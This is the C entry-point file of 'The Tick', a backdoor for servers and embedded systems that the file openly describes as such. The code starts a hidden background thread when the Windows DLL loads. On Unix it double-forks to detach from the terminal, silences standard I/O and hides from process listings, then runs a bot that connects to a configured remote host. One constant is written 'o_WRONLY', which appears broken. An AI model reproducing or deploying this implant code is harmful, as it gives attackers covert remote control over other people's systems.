/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "libmain.h"

#include "config.h"
#include "parser.h"
#include "command.h"

#ifdef _WIN32

DWORD WINAPI _stub_libmain(LPVOID lpParam);

// Windows version. Here we have a standard way of being called when we're loaded.
// However the state of the process may be quite unstable, depending on how
// the DLL was loaded. To be on the safe side, we create a background thread.
// The thread will be automatically locked until DLL initialization is complete.
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved __attribute__((unused)))
{
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            CloseHandle(CreateThread(NULL, 0, &_stub_libmain, NULL, 0, NULL));
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

DWORD WINAPI _stub_libmain(LPVOID lpParam __attribute__((unused)))
{
    // Load the configuration.
    Settings s;
    get_configuration(&s, 0, NULL);

    // If we don't have a hostname and port to connect to, quit.
    if (s.hostname[0] == 0 || s.port == 0) ExitThread(0);

    // Run the bot.
    run(&s);
    ExitThread(0);
}

#else

static void libmain(void)
{
    // This implements the classic Unix double-fork trick.
    // The main difference is we don't exit the first parent process,
    // since we want the original program to run correctly.
    if (fork() == 0) {

        // Remove ourselves from the process group.
        setpgrp();

        // Prevent a SIGHUP on shell exit by ignoring the signal entirely.
        signal(SIGHUP, SIG_IGN);

        // Ignore SIGPIPE to avoid crashing in case of abrupt socket close.
        signal(SIGPIPE, SIG_IGN);

#if ! TICK_VERBOSE

        // Disassociate from the terminal, since we're not using it.
        int fd = open("/dev/tty", O_RDWR);
        if (fd >= 0) {
            ioctl(fd, TIOCNOTTY, 0);
            close(fd);
        }

        // Close all of the parent's files and create new standard
        // input, output and error files pointed to /dev/null.
        for (fd = 0; fd < NOFILE; fd++) close(fd);
        open("/dev/null", O_RDONLY);
        open("/dev/null", O_WRONLY);
        open("/dev/null", o_WRONLY);

#endif

        // Second fork to fully disassociate from the parent process tree.
        // This way we won't even show up on ps as having forked from here.
        if (fork() != 0) exit(0);

        // Load the configuration.
        Settings s;
        get_configuration(&s, 0, NULL);

        // If we don't have a hostname and port to connect to, quit.
        if (s.hostname[0] == 0 || s.port == 0) exit(0);

        // Run the bot.
        exit(run(&s));
    }

    // This return instruction is only executed on the original process.
    return;
}

#endif
